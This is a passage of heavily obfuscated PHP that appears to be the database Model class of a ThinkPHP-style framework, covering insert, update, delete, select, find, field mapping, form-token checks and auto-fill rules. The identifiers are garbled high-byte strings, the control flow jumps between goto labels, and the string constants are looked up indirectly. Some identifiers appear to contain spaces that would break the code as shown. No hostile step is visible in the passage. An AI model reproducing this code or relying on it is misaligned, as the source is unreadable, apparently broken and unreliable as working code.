$e¡¦ÌˆË±[253]), array($b˜Æƒ¸¢Æİ, $c®’õ§Œ„°, $f¥áÌİªšË)); if ($cî°ŒòË¿) { return $cî°ŒòË¿; } } return $f¥áÌİªšË; goto e§„Œà©ª; EøÈÓ£† ƒ: $b˜Æƒ¸¢Æİ = $E¼Ì±“ÔåŞ; if (is_array($E¼Ì±“ÔåŞ)) { $b˜Æƒ¸¢Æİ = $E¼Ì±“ÔåŞ[1]; $E¼Ì±“ÔåŞ = $E¼Ì±“ÔåŞ[0]; } $fîÆÈŠö¦ = count($c®’õ§Œ„°) - 1; goto B¥ÇšÓğÜØ; C—¹¥Â÷“¨: $e¡¦ÌˆË± =& $_SERVER[õëù©û]; $c®’õ§Œ„° = func_get_args(); $E¼Ì±“ÔåŞ = array_shift($c®’õ§Œ„°); goto EøÈÓ£† ƒ; B¥ÇšÓğÜØ: if (isset($c®’õ§Œ„°[$fîÆÈŠö¦]) && $c®’õ§Œ„°[$fîÆÈŠö¦] === $E¼Ì±“ÔåŞ) { think_exception(__CLASS__ . $e¡¦ÌˆË±[4] . $E¼Ì±“ÔåŞ . think_lang($e¡¦ÌˆË±[249])); return; } $c®’õ§Œ„°[] = $E¼Ì±“ÔåŞ; if (method_exists($this, $e¡¦ÌˆË±[250])) { $cî°ŒòË¿ = call_user_func_array(array($this, $e¡¦ÌˆË±[251]), array($b˜Æƒ¸¢Æİ, $c®’õ§Œ„°)); if (!is_null($cî°ŒòË¿) && $cî°ŒòË¿ !== !1) { return $cî°ŒòË¿; } } goto Dù­²œÛùÜ; e§„Œà©ª: } protected function _initialize() { } protected function _facade($AÖ…Ìî¾‘š) { $AÀÉ£–ŠïÌ =& $_SERVER[õëù©û]; if (!empty($this->fields)) { foreach ($AÖ…Ìî¾‘š as $D½Š°‰ƒŒ => $C ¼°­ªõÎ) { if (!in_array($D½Š°‰ƒŒ, $this->fields, !0)) { unset($AÖ…Ìî¾‘š[$D½Š°‰ƒŒ]); } elseif (is_scalar($C ¼°­ªõÎ)) { $this->_parseType($AÖ…Ìî¾‘š, $D½Š°‰ƒŒ); } } } if (!empty($this->options[$AÀÉ£–ŠïÌ[254]])) { $AÖ…Ìî¾‘š = array_map($this->options[$AÀÉ£–ŠïÌ[254]], $AÖ…Ìî¾‘š); unset($this->options[$AÀÉ£–ŠïÌ[254]]); } $this->_beforeWrite($AÖ…Ìî¾‘š); return $AÖ…Ìî¾‘š; } protected function _beforeWrite(&$cÅƒ¢Š…òï) { } public function add($f‘º…«³…¬ = '', $aŸ‘˜¾¸ÉÉ = array(), $D‹î‡àÙÈ = false) { goto E«çÚÜŞÌ²; a ÔÍà†»: if (!1 === $this->_beforeInsert($f‘º…«³…¬, $aŸ‘˜¾¸ÉÉ)) { return !1; } $aô×…ŒÙï = $this->db->insert($f‘º…«³…¬, $aŸ‘˜¾¸ÉÉ, $D‹î‡àÙÈ); if (!1 !== $aô×…ŒÙï) { $aÚŠ ÛÕ‡Ï = $this->getLastInsID(); if ($aÚŠ ÛÕ‡Ï) { $f‘º…«³…¬[$this->getPk()] = $aÚŠ ÛÕ‡Ï; $this->_after_insert($f‘º…«³…¬, $aŸ‘˜¾¸ÉÉ); return $aÚŠ ÛÕ‡Ï; } $this->_after_insert($f‘º…«³…¬, $aŸ‘˜¾¸ÉÉ); } goto e£’Í „Ú; E«çÚÜŞÌ²: if (empty($f‘º…«³…¬)) { if (!empty($this->data)) { $f‘º…«³…¬ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[õëù©û][255]); return !1; } } $aŸ‘˜¾¸ÉÉ = $this->_parseOptions($aŸ‘˜¾¸ÉÉ); $f‘º…«³…¬ = $this->_facade($f‘º…«³…¬); goto a ÔÍà†»; e£’Í „Ú: return $aô×…ŒÙï; goto dãó¨ÒÁ˜ù; dãó¨ÒÁ˜ù: } protected function _beforeInsert(&$D£Æ¡åÒ·, $FÉ†Õ¡“­) { } protected function _after_insert($fÑš‡¯Ã¬ô, $F™¨’°éÒ ) { } public function addAll($DÚßšİ½Ş¦, $a”ÉÄö‘ë = array(), $CÉ–›¾äŠ = false) { goto a¼Ã‡˜ÔÈ; Eğ•ØˆŠ¸: return $e»‘Â‚ßĞƒ; goto Dëœ›á‰„‡; a¼Ã‡˜ÔÈ: $c÷Û‡ŒĞ =& $_SERVER[õëù©û]; if (empty($DÚßšİ½Ş¦)) { $this->error = think_lang($c÷Û‡ŒĞ[255]); return !1; } $a”ÉÄö‘ë = $this->_parseOptions($a”ÉÄö‘ë); goto CßÒËÏÌ‘ó; CßÒËÏÌ‘ó: foreach ($DÚßšİ½Ş¦ as $F‹‘ì–ÔÃ => $E¶¾¹ĞËš—) { $DÚßšİ½Ş¦[$F‹‘ì–ÔÃ] = $this->_facade($E¶¾¹ĞËš—); } if (method_exists($this->db, $c÷Û‡ŒĞ[256])) { $e»‘Â‚ßĞƒ = $this->db->insertAll($DÚßšİ½Ş¦, $a”ÉÄö‘ë, $CÉ–›¾äŠ); } else { $this->startTrans(); foreach ($DÚßšİ½Ş¦ as $F‹‘ì–ÔÃ => $E¶¾¹ĞËš—) { $e»‘Â‚ßĞƒ = $this->db->insert($E¶¾¹ĞËš—, $a”ÉÄö‘ë, $CÉ–›¾äŠ); } $this->commit(); } if (!1 !== $e»‘Â‚ßĞƒ) { $CŒƒÀ—£‹İ = $this->getLastInsID(); if ($CŒƒÀ—£‹İ) { return $CŒƒÀ—£‹İ; } } goto Eğ•ØˆŠ¸; Dëœ›á‰„‡: } public function selectAdd($E¤åÓ¸† = '', $câÅä‘© = '', $b©‡³‘µä = array()) { $dÎ±„ƒîäº =& $_SERVER[õëù©û]; $b©‡³‘µä = $this->_parseOptions($b©‡³‘µä); if (!1 === ($d°Ñõ°èï = $this->db->selectInsert($E¤åÓ¸† ? $E¤åÓ¸† : $b©‡³‘µä[$dÎ±„ƒîäº[257]], $câÅä‘© ? $câÅä‘© : $this->getTableName(), $b©‡³‘µä))) { $this->error = think_lang($dÎ±„ƒîäº[258]); return !1; } else { return $d°Ñõ°èï; } } public function save($CÄ‚‚‹ˆÈ = '', $A¢Òº¯ï¨ä = array()) { goto d—¦†‘¶à; A­‚§¡õ›: $A¢Òº¯ï¨ä = $this->_parseOptions($A¢Òº¯ï¨ä); $f¥—æ¼êñ = $this->getPk(); if (!isset($A¢Òº¯ï¨ä[$A†±¤ø°½[259]])) { if (isset($CÄ‚‚‹ˆÈ[$f¥—æ¼êñ])) { $dø˜¶Æ®®¨[$f¥—æ¼êñ] = $CÄ‚‚‹ˆÈ[$f¥—æ¼êñ]; $A¢Òº¯ï¨ä[$A†±¤ø°½[259]] = $dø˜¶Æ®®¨; unset($CÄ‚‚‹ˆÈ[$f¥—æ¼êñ]); } else { $this->error = think_lang($A†±¤ø°½[258]); return !1; } } goto FÜ›Œ»»ÃÜ; FÜ›Œ»»ÃÜ: if (is_array($A¢Òº¯ï¨ä[$A†±¤ø°½[259]]) && isset($A¢Òº¯ï¨ä[$A†±¤ø°½[259]][$f¥—æ¼êñ])) { $b›­‘ÇŒ‰Æ = $A¢Òº¯ï¨ä[$A†±¤ø°½[259]][$f¥—æ¼êñ]; } if (!1 === $this->_beforeUpdate($CÄ‚‚‹ˆÈ, $A¢Òº¯ï¨ä)) { return !1; } $C±ßà—¿ë• = $this->db->update($CÄ‚‚‹ˆÈ, $A¢Òº¯ï¨ä); goto dÓİá³ºîÎ; dÓİá³ºîÎ: if (!1 !== $C±ßà—¿ë•) { if (isset($b›­‘ÇŒ‰Æ)) { $CÄ‚‚‹ˆÈ[$f¥—æ¼êñ] = $b›­‘ÇŒ‰Æ; } $this->_afterUpdate($CÄ‚‚‹ˆÈ, $A¢Òº¯ï¨ä); } return $C±ßà—¿ë•; goto D×­‘ìÕ­¸; d—¦†‘¶à: $A†±¤ø°½ =& $_SERVER[õëù©û]; if (empty($CÄ‚‚‹ˆÈ)) { if (!empty($this->data)) { $CÄ‚‚‹ˆÈ = $this->data; $this->data = array(); } else { $this->error = think_lang($A†±¤ø°½[255]); return !1; } } $CÄ‚‚‹ˆÈ = $this->_facade($CÄ‚‚‹ˆÈ); goto A­‚§¡õ›; D×­‘ìÕ­¸: } protected function _beforeUpdate(&$EãåÉóŠø×, $CÔºàÚ¸ˆ) { } protected function _afterUpdate($aèœ°õÁÌ°, $bËå¤›²ğ) { } public function delete($b±¾ôóœÔ“ = array()) { goto Bìˆç±œ¦’; A¼ÈŒà‡„à: if (is_numeric($b±¾ôóœÔ“) || is_string($b±¾ôóœÔ“)) { if (strpos($b±¾ôóœÔ“, $C˜Ò‰å©µŠ[47])) { $dÏ™—ƒ´°™[$DÔ²½«ĞŞ] = array($C˜Ò‰å©µŠ[260], $b±¾ôóœÔ“); } else { $dÏ™—ƒ´°™[$DÔ²½«ĞŞ] = $b±¾ôóœÔ“; } $this->options[$C˜Ò‰å©µŠ[259]] = $dÏ™—ƒ´°™; } $b±¾ôóœÔ“ = $this->_parseOptions(); if (is_array($b±¾ôóœÔ“[$C˜Ò‰å©µŠ[259]]) && isset($b±¾ôóœÔ“[$C˜Ò‰å©µŠ[259]][$DÔ²½«ĞŞ])) { $CÕáŒÄïÂ = $b±¾ôóœÔ“[$C˜Ò‰å©µŠ[259]][$DÔ²½«ĞŞ]; } goto cù¼áÈ”Ëù; cù¼áÈ”Ëù: $Cµ²Ç¹™Ï = $this->db->delete($b±¾ôóœÔ“); if (!1 !== $Cµ²Ç¹™Ï) { $fí§š = array(); if (isset($CÕáŒÄïÂ)) { $fí§š[$DÔ²½«ĞŞ] = $CÕáŒÄïÂ; } $this->_after_delete($fí§š, $b±¾ôóœÔ“); } return $Cµ²Ç¹™Ï; goto fáß“‚ÇÍ¢; Bìˆç±œ¦’: $C˜Ò‰å©µŠ =& $_SERVER[õëù©û]; if (empty($b±¾ôóœÔ“) && empty($this->options[$C˜Ò‰å©µŠ[259]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $DÔ²½«ĞŞ = $this->getPk(); goto A¼ÈŒà‡„à; fáß“‚ÇÍ¢: } protected function _after_delete($D”³Í‡õÌ, $A½„ïÚôß›) { } public function select($cô¡ËÀ—± = array()) { goto EÓÉ“éŞ’; CòØ¢—§™º: $d¼Ê’Ï¹¾å = $this->db->select($cô¡ËÀ—±); if (!1 === $d¼Ê’Ï¹¾å) { return !1; } if (empty($d¼Ê’Ï¹¾å)) { return null; } goto FğªÜÎ¯¥; FğªÜÎ¯¥: $this->_afterSelect($d¼Ê’Ï¹¾å, $cô¡ËÀ—±); return $d¼Ê’Ï¹¾å; goto D–Û§ñ·Ÿ©; EÓÉ“éŞ’: $Fã™Í®ß‹¢ =& $_SERVER[õëù©û]; if (is_string($cô¡ËÀ—±) || is_numeric($cô¡ËÀ—±)) { $CÁÆ’½°È‘ = $this->getPk(); if (strpos($cô¡ËÀ—±, $Fã™Í®ß‹¢[47])) { $cƒ§á¯ùå[$CÁÆ’½°È‘] = array($Fã™Í®ß‹¢[260], $cô¡ËÀ—±); } else { $cƒ§á¯ùå[$CÁÆ’½°È‘] = $cô¡ËÀ—±; } $this->options[$Fã™Í®ß‹¢[259]] = $cƒ§á¯ùå; } elseif (!1 === $cô¡ËÀ—±) { $cô¡ËÀ—± = $this->_parseOptions(); return $Fã™Í®ß‹¢[261] . $this->db->buildSelectSql($cô¡ËÀ—±) . $Fã™Í®ß‹¢[262]; } $cô¡ËÀ—± = $this->_parseOptions(); goto CòØ¢—§™º; D–Û§ñ·Ÿ©: } protected function _afterSelect(&$C»½“ãà»ê, $b«À¬§¡ø) { } public function buildSql($dë¹ÕßŞË× = array()) { $dºÜî³æêÒ =& $_SERVER[õëù©û]; $dë¹ÕßŞË× = $this->_parseOptions($dë¹ÕßŞË×); return $dºÜî³æêÒ[261] . $this->db->buildSelectSql($dë¹ÕßŞË×) . $dºÜî³æêÒ[262]; } public function optionsValue($EØ¿Í˜Ş¼Ÿ = null) { if (is_null($EØ¿Í˜Ş¼Ÿ)) { return $this->options; } elseif (is_array($EØ¿Í˜Ş¼Ÿ)) { $this->options = array_merge($this->options, $EØ¿Í˜Ş¼Ÿ); } } protected function _parseOptions($BÀ©ÔÎŸùÂ = array()) { goto BÒ™¤¬î; A—²Ó‘ØÚ§: if (!isset($BÀ©ÔÎŸùÂ[$f„ÌÌİ½Ã¡[263]])) { $BÀ©ÔÎŸùÂ[$f„ÌÌİ½Ã¡[263]] = $this->getTableName(); $cÁ‡ˆğÜ¼ö = $this->fields; } else { $cÁ‡ˆğÜ¼ö = $this->getDbFields(); } if (!empty($BÀ©ÔÎŸùÂ[$f„ÌÌİ½Ã¡[264]])) { $BÀ©ÔÎŸùÂ[$f„ÌÌİ½Ã¡[263]] .= $f„ÌÌİ½Ã¡[50] . $BÀ©ÔÎŸùÂ[$f„ÌÌİ½Ã¡[264]]; } $BÀ©ÔÎŸùÂ[$f„ÌÌİ½Ã¡[265]] = $this->name; goto B§ñÈß†¶; B§ñÈß†¶: if (isset($BÀ©ÔÎŸùÂ[$f„ÌÌİ½Ã¡[259]]) && is_array($BÀ©ÔÎŸùÂ[$f„ÌÌİ½Ã¡[259]]) && !empty($cÁ‡ˆğÜ¼ö) && !isset($BÀ©ÔÎŸùÂ[$f„ÌÌİ½Ã¡[266]]) && !isset($BÀ©ÔÎŸùÂ[$f„ÌÌİ½Ã¡[263]])) { foreach ($BÀ©ÔÎŸùÂ[$f„ÌÌİ½Ã¡[259]] as $dÅä¹¬ƒ«Ü => $dä‡óÄ×Å) { $dÅä¹¬ƒ«Ü = trim($dÅä¹¬ƒ«Ü); if (in_array($dÅä¹¬ƒ«Ü, $cÁ‡ˆğÜ¼ö, !0)) { if (is_scalar($dä‡óÄ×Å)) { $this->_parseType($BÀ©ÔÎŸùÂ[$f„ÌÌİ½Ã¡[259]], $dÅä¹¬ƒ«Ü); } } elseif (!is_numeric($dÅä¹¬ƒ«Ü) && $f„ÌÌİ½Ã¡[70] != substr($dÅä¹¬ƒ«Ü, 0, 1) && !1 === strpos($dÅä¹¬ƒ«Ü, $f„ÌÌİ½Ã¡[91]) && !1 === strpos($dÅä¹¬ƒ«Ü, $f„ÌÌİ½Ã¡[244]) && !1 === strpos($dÅä¹¬ƒ«Ü, $f„ÌÌİ½Ã¡[267]) && !1 === strpos($dÅä¹¬ƒ«Ü, $f„ÌÌİ½Ã¡[268])) { unset($BÀ©ÔÎŸùÂ[$f„ÌÌİ½Ã¡[259]][$dÅä¹¬ƒ«Ü]); } } } $this->_options_filter($BÀ©ÔÎŸùÂ); return $BÀ©ÔÎŸùÂ; goto AöåÆŒÓ‘É; BÒ™¤¬î: $f„ÌÌİ½Ã¡ =& $_SERVER[õëù©û]; if (is_array($BÀ©ÔÎŸùÂ)) { $BÀ©ÔÎŸùÂ = array_merge($this->options, $BÀ©ÔÎŸùÂ); } $this->options = array(); goto A—²Ó‘ØÚ§; AöåÆŒÓ‘É: } protected function _options_filter(&$cË®‘ÆƒÌé) { } protected function _parseType(&$AŠˆç¯„İ, $cÂ„´æ‘Çï) { $D†ê÷ë¡ç˜ =& $_SERVER[õëù©û]; if (empty($this->options[$D†ê÷ë¡ç˜[269]][$D†ê÷ë¡ç˜[4] . $cÂ„´æ‘Çï])) { $eˆ’›ñİÌ = strtolower($this->fields[$D†ê÷ë¡ç˜[236]][$cÂ„´æ‘Çï]); if (!1 !== strpos($eˆ’›ñİÌ, $D†ê÷ë¡ç˜[270])) { } elseif (!1 === strpos($eˆ’›ñİÌ, $D†ê÷ë¡ç˜[271]) && !1 !== strpos($eˆ’›ñİÌ, $D†ê÷ë¡ç˜[272])) { $AŠˆç¯„İ[$cÂ„´æ‘Çï] = intval($AŠˆç¯„İ[$cÂ„´æ‘Çï]); } elseif (!1 !== strpos($eˆ’›ñİÌ, $D†ê÷ë¡ç˜[273]) || !1 !== strpos($eˆ’›ñİÌ, $D†ê÷ë¡ç˜[274])) { $AŠˆç¯„İ[$cÂ„´æ‘Çï] = floatval($AŠˆç¯„İ[$cÂ„´æ‘Çï]); } elseif (!1 !== strpos($eˆ’›ñİÌ, $D†ê÷ë¡ç˜[275])) { $AŠˆç¯„İ[$cÂ„´æ‘Çï] = (bool) $AŠˆç¯„İ[$cÂ„´æ‘Çï]; } } } public function find($Bˆ¨¿Ë’É = array()) { goto E“†æ§ˆœ; d¼˜¿…‹­ç: $Bˆ¨¿Ë’É = $this->_parseOptions(); $D‚ˆ±¤©‚ = $this->db->select($Bˆ¨¿Ë’É); if (!1 === $D‚ˆ±¤©‚) { return !1; } goto E¦÷™¨Ùîõ; E“†æ§ˆœ: $Bç®î¦„Ï• =& $_SERVER[õëù©û]; if (is_numeric($Bˆ¨¿Ë’É) || is_string($Bˆ¨¿Ë’É)) { $A†Ö¯Üãì»[$this->getPk()] = intval($Bˆ¨¿Ë’É); $this->options[$Bç®î¦„Ï•[259]] = $A†Ö¯Üãì»; } $this->options[$Bç®î¦„Ï•[276]] = 1; goto d¼˜¿…‹­ç; E¦÷™¨Ùîõ: if (empty($D‚ˆ±¤©‚)) { return null; } $this->data = $D‚ˆ±¤©‚[0]; $this->_afterFind($this->data, $Bˆ¨¿Ë’É); goto CóäğâÍ•ê; CóäğâÍ•ê: if (!empty($this->options[$Bç®î¦„Ï•[277]])) { return $this->returnResult($this->data, $this->options[$Bç®î¦„Ï•[277]]); } return $this->data; goto Bæèàñ¿Ø; Bæèàñ¿Ø: } protected function _afterFind(&$CÀÇ½øˆÙ­, $cº¯®„¬ë) { } protected function returnResult($B‘œ¶‡¹á, $c…¨‚„½­Õ = '') { $aÍùöÇ²÷Ü =& $_SERVER[õëù©û]; if ($c…¨‚„½­Õ) { if (is_callable($c…¨‚„½­Õ)) { return call_user_func($c…¨‚„½­Õ, $B‘œ¶‡¹á); } switch (strtolower($c…¨‚„½­Õ)) { case $aÍùöÇ²÷Ü[278]: return json_encode($B‘œ¶‡¹á); case $aÍùöÇ²÷Ü[279]: return xml_encode($B‘œ¶‡¹á); } } return $B‘œ¶‡¹á; } public function parseFieldsMap($eè•å°ÜÑ‡, $e“‚°¥‚Î· = 1) { if (!empty($this->_map)) { foreach ($this->_map as $bîäší‡¨ => $F’ìÖˆõ·‰) { if ($e“‚°¥‚Î· == 1) { if (isset($eè•å°ÜÑ‡[$F’ìÖˆõ·‰])) { $eè•å°ÜÑ‡[$bîäší‡¨] = $eè•å°ÜÑ‡[$F’ìÖˆõ·‰]; unset($eè•å°ÜÑ‡[$F’ìÖˆõ·‰]); } } else { if (isset($eè•å°ÜÑ‡[$bîäší‡¨])) { $eè•å°ÜÑ‡[$F’ìÖˆõ·‰] = $eè•å°ÜÑ‡[$bîäší‡¨]; unset($eè•å°ÜÑ‡[$bîäší‡¨]); } } } } return $eè•å°ÜÑ‡; } public function setField($DÍ¸‰²„³, $F‹ğøö‘Á = '') { if (is_array($DÍ¸‰²„³)) { $BÌ¯Êƒƒë = $DÍ¸‰²„³; } else { $BÌ¯Êƒƒë[$DÍ¸‰²„³] = $F‹ğøö‘Á; } return $this->save($BÌ¯Êƒƒë); } public function setAdd($bŒ‹¢î‹Ì´, $c•‰ğÚ·ª = 1) { $D·ÃéÎ‡ñ =& $_SERVER[õëù©û]; $aÂÛäÙÄÍÔ = $bŒ‹¢î‹Ì´ . $D·ÃéÎ‡ñ[280] . $c•‰ğÚ·ª; if ($c•‰ğÚ·ª < 0) { $aÂÛäÙÄÍÔ = $bŒ‹¢î‹Ì´ . $c•‰ğÚ·ª; } return $this->setField($bŒ‹¢î‹Ì´, array($D·ÃéÎ‡ñ[281], $aÂÛäÙÄÍÔ)); } public function getField($E£²“¦¡ç», $aãíïî¹›‰ = null) { $CÄØİğáŞò =& $_SERVER[õëù©û]; $b‰‡òŞ°¹[$CÄØİğáŞò[257]] = $E£²“¦¡ç»; $b‰‡òŞ°¹ = $this->_parseOptions($b‰‡òŞ°¹); $E£²“¦¡ç» = trim($E£²“¦¡ç»); if (strpos($E£²“¦¡ç», $CÄØİğáŞò[47])) { if (!isset($b‰‡òŞ°¹[$CÄØİğáŞò[276]])) { $b‰‡òŞ°¹[$CÄØİğáŞò[276]] = is_numeric($aãíïî¹›‰) ? $aãíïî¹›‰ : $CÄØİğáŞò[33]; } $dª—šÌ˜Ú¥ = $this->db->select($b‰‡òŞ°¹); if (!empty($dª—šÌ˜Ú¥)) { goto fİ §¤¸¹; A¢Ç§¯À: $D²æËæë†Š = array_shift($E£²“¦¡ç»); $DÄáò«Ò¯ = array(); $dø­Ø¾î§ø = count($E÷ïƒÌÙø·); goto eµ…±ë×ŒÖ; eµ…±ë×ŒÖ: foreach ($dª—šÌ˜Ú¥ as $F‹™¹ÔèÙ¥) { $e£«´¿ğ¹‡ = $F‹™¹ÔèÙ¥[$E¬ó¾°ØÌä]; if (2 == $dø­Ø¾î§ø) { $DÄáò«Ò¯[$e£«´¿ğ¹‡] = $F‹™¹ÔèÙ¥[$D²æËæë†Š]; } else { $DÄáò«Ò¯[$e£«´¿ğ¹‡] = is_string($aãíïî¹›‰) ? implode($aãíïî¹›‰, $F‹™¹ÔèÙ¥) : $F‹™¹ÔèÙ¥; } } return $DÄáò«Ò¯; goto f‚ÉŞ¿Ö±š; fİ §¤¸¹: $E÷ïƒÌÙø· = explode($CÄØİğáŞò[47], $E£²“¦¡ç»); $E£²“¦¡ç» = array_keys($dª—šÌ˜Ú¥[0]); $E¬ó¾°ØÌä = array_shift($E£²“¦¡ç»); goto A¢Ç§¯À; f‚ÉŞ¿Ö±š: } } else { if (!0 !== $aãíïî¹›‰) { $b‰‡òŞ°¹[$CÄØİğáŞò[276]] = is_numeric($aãíïî¹›‰) ? $aãíïî¹›‰ : 1; } if ($aãíïî¹›‰ === $CÄØİğáŞò[239]) { unset($b‰‡òŞ°¹[$CÄØİğáŞò[276]]); } $F‹™¹ÔèÙ¥ = $this->db->select($b‰‡òŞ°¹); if (!empty($F‹™¹ÔèÙ¥)) { if ($aãíïî¹›‰ === $CÄØİğáŞò[239]) { return reset($F‹™¹ÔèÙ¥[0]); } if (!0 !== $aãíïî¹›‰ && 1 == $b‰‡òŞ°¹[$CÄØİğáŞò[276]]) { return reset($F‹™¹ÔèÙ¥[0]); } foreach ($F‹™¹ÔèÙ¥ as $A½—à†Úê·) { $fóÅÏµ±öÒ[] = $A½—à†Úê·[$E£²“¦¡ç»]; } return $fóÅÏµ±öÒ; } } return null; } public function create($BŸ¢ËŞ´µø = '', $A²×‰‚Ê¯ = '') { goto c’‰¾¬Üñõ; F°¡×Ÿ¶¿÷: if (isset($F‡Æ‹ôœ§Å)) { if (is_string($F‡Æ‹ôœ§Å)) { $F‡Æ‹ôœ§Å = explode($B¼Â´—ŠÓ™[47], $F‡Æ‹ôœ§Å); } if (think_config($B¼Â´—ŠÓ™[282])) { $F‡Æ‹ôœ§Å[] = think_config($B¼Â´—ŠÓ™[283]); } foreach ($BŸ¢ËŞ´µø as $F› Àğç™º => $a‘¢—²ç×¿) { if (!in_array($F› Àğç™º, $F‡Æ‹ôœ§Å)) { unset($BŸ¢ËŞ´µø[$F› Àğç™º]); } } } if (!$this->autoValidation($BŸ¢ËŞ´µø, $A²×‰‚Ê¯)) { return !1; } if (!$this->autoCheckToken($BŸ¢ËŞ´µø)) { $this->error = think_lang($B¼Â´—ŠÓ™[284]); return !1; } goto EÒ«×ªçšê; A’Õ…£ß´: return $BŸ¢ËŞ´µø; goto A„è¹ªÈ…; c’‰¾¬Üñõ: $B¼Â´—ŠÓ™ =& $_SERVER[õëù©û]; if (empty($BŸ¢ËŞ´µø)) { $BŸ¢ËŞ´µø = $_POST; } elseif (is_object($BŸ¢ËŞ´µø)) { $BŸ¢ËŞ´µø = get_object_vars($BŸ¢ËŞ´µø); } if (empty($BŸ¢ËŞ´µø) || !is_array($BŸ¢ËŞ´µø)) { $this->error = think_lang($B¼Â´—ŠÓ™[255]); return !1; } goto C‡Ô“Û¹ô; EÒ«×ªçšê: if ($this->autoCheckFields) { $F‡Æ‹ôœ§Å = $this->getDbFields(); foreach ($BŸ¢ËŞ´µø as $F› Àğç™º => $a‘¢—²ç×¿) { if (!in_array($F› Àğç™º, $F‡Æ‹ôœ§Å)) { unset($BŸ¢ËŞ´µø[$F› Àğç™º]); } elseif (MAGIC_QUOTES_GPC && is_string($a‘¢—²ç×¿)) { $BŸ¢ËŞ´µø[$F› Àğç™º] = stripslashes($a‘¢—²ç×¿); } } } $this->autoOperation($BŸ¢ËŞ´µø, $A²×‰‚Ê¯); $this->data = $BŸ¢ËŞ´µø; goto A’Õ…£ß´; C‡Ô“Û¹ô: $BŸ¢ËŞ´µø = $this->parseFieldsMap($BŸ¢ËŞ´µø, 0); $A²×‰‚Ê¯ = $A²×‰‚Ê¯ ? $A²×‰‚Ê¯ : (!empty($BŸ¢ËŞ´µø[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$B¼Â´—ŠÓ™[257]])) { $F‡Æ‹ôœ§Å = $this->options[$B¼Â´—ŠÓ™[257]]; unset($this->options[$B¼Â´—ŠÓ™[257]]); } elseif ($A²×‰‚Ê¯ == THINK_MODEL_INSERT && isset($this->insertFields)) { $F‡Æ‹ôœ§Å = $this->insertFields; } elseif ($A²×‰‚Ê¯ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $F‡Æ‹ôœ§Å = $this->updateFields; } goto F°¡×Ÿ¶¿÷; A„è¹ªÈ…: } public function autoCheckToken($eÚÜ†¬Òô•) { $DÁïêöÑ† =& $_SERVER[õëù©û]; if (isset($this->options[$DÁïêöÑ†[285]]) && !$this->options[$DÁïêöÑ†[285]]) { return !0; } if (think_config($DÁïêöÑ†[282])) { $cä†÷âòï = think_config($DÁïêöÑ†[283]); if (!isset($eÚÜ†¬Òô•[$cä†÷âòï]) || Session::get($cä†÷âòï)) { return !1; } list($E˜Âóì»÷Ú, $Fï›­ÚğÚê) = explode($DÁïêöÑ†[70], $eÚÜ†¬Òô•[$cä†÷âòï]); if ($Fï›­ÚğÚê && Session::get($cä†÷âòï . $DÁïêöÑ†[91] . $E˜Âóì»÷Ú) === $Fï›­ÚğÚê) { Session::remove($cä†÷âòï . $DÁïêöÑ†[91] . $E˜Âóì»÷Ú); return !0; } if (think_config($DÁïêöÑ†[286])) { Session::remove($cä†÷âòï . $DÁïêöÑ†[91] . $E˜Âóì»÷Ú); } return !1; } return !0; } public function regex($F•à¢·„šÇ, $cØ‡ùÏ›Ù) { $b–¨á®Ô¯¶ =& $_SERVER[õëù©û]; $C†è‹–‚ªæ = array($b–¨á®Ô¯¶[287] => $b–¨á®Ô¯¶[288], $b–¨á®Ô¯¶[289] => $b–¨á®Ô¯¶[290], $b–¨á®Ô¯¶[291] => $b–¨á®Ô¯¶[292], $b–¨á®Ô¯¶[293] => $b–¨á®Ô¯¶[294], $b–¨á®Ô¯¶[295] => $b–¨á®Ô¯¶[296], $b–¨á®Ô¯¶[297] => $b–¨á®Ô¯¶[298], $b–¨á®Ô¯¶[299] => $b–¨á®Ô¯¶[300], $b–¨á®Ô¯¶[274] => $b–¨á®Ô¯¶[301], $b–¨á®Ô¯¶[302] => $b–¨á®Ô¯¶[303]); if (isset($C†è‹–‚ªæ[strtolower($cØ‡ùÏ›Ù)])) { $cØ‡ùÏ›Ù = $C†è‹–‚ªæ[strtolower($cØ‡ùÏ›Ù)]; } return preg_match($cØ‡ùÏ›Ù, $F•à¢·„šÇ) === 1; } private function autoOperation(&$EàªŒŞŞéÛ, $eç‡„¿ÕğÁ) { $bá¾ô¼ßÃ¸ =& $_SERVER[õëù©û]; if (!empty($this->options[$bá¾ô¼ßÃ¸[304]])) { $EøéÆÂˆŞ = $this->options[$bá¾ô¼ßÃ¸[304]]; unset($this->options[$bá¾ô¼ßÃ¸[304]]); } elseif (!empty($this->_auto)) { $EøéÆÂˆŞ = $this->_auto; } if (isset($EøéÆÂˆŞ)) { foreach ($EøéÆÂˆŞ as $B‹…ŠÏ…İ») { if (empty($B‹…ŠÏ…İ»[2])) { $B‹…ŠÏ…İ»[2] = THINK_MODEL_INSERT; } if ($eç‡„¿ÕğÁ == $B‹…ŠÏ…İ»[2] || $B‹…ŠÏ…İ»[2] == THINK_MODEL_BOTH) { switch (trim($B‹…ŠÏ…İ»[3])) { case $bá¾ô¼ßÃ¸[305]: case $bá¾ô¼ßÃ¸[306]: $dÇ§šÁÁÁ– = isset($B‹…ŠÏ…İ»[4]) ? (array) $B‹…ŠÏ…İ»[4] : array(); if (isset($EàªŒŞŞéÛ[$B‹…ŠÏ…İ»[0]])) { array_unshift($dÇ§šÁÁÁ–, $EàªŒŞŞéÛ[$B‹…ŠÏ…İ»[0]]); } if ($bá¾ô¼ßÃ¸[305] == $B‹…ŠÏ…İ»[3]) { $EàªŒŞŞéÛ[$B‹…ŠÏ…İ»[0]] = call_user_func_array($B‹…ŠÏ…İ»[1], $dÇ§šÁÁÁ–); } else { $EàªŒŞŞéÛ[$B‹…ŠÏ…İ»[0]] = call_user_func_array(array(&$this, $B‹…ŠÏ…İ»[1]), $dÇ§šÁÁÁ–); } break; case $bá¾ô¼ßÃ¸[257]: $EàªŒŞŞéÛ[$B‹…ŠÏ…İ»[0]] = $EàªŒŞŞéÛ[$B‹…ŠÏ…İ»[1]]; break; case $bá¾ô¼ßÃ¸[307]: if ($bá¾ô¼ßÃ¸[33] === $EàªŒŞŞéÛ[$B‹…ŠÏ…İ»[0]]) { unset($EàªŒŞŞéÛ[$B‹…ŠÏ…İ»[0]]); } break; case $bá¾ô¼ßÃ¸[308]: default: $EàªŒŞŞéÛ[$B‹…ŠÏ…İ»[0]] = $B‹…ŠÏ…İ»[1]; } if (!1 === 